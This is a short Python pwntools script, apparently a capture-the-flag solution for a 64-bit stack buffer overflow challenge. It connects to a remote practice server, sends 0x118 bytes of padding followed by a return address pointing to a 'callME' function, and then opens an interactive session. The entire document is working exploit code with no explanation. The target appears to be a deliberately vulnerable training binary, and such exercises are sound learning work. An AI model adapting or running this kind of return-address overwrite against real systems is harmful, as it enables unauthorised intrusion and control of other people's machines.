from pwn import *

#p=process("64bof_basic")
p=remote("ctf.j0n9hyun.xyz", 3004)

callME=0x400606
payload='A'*0x118+p64(callME)

p.sendline(payload)
p.interactive()
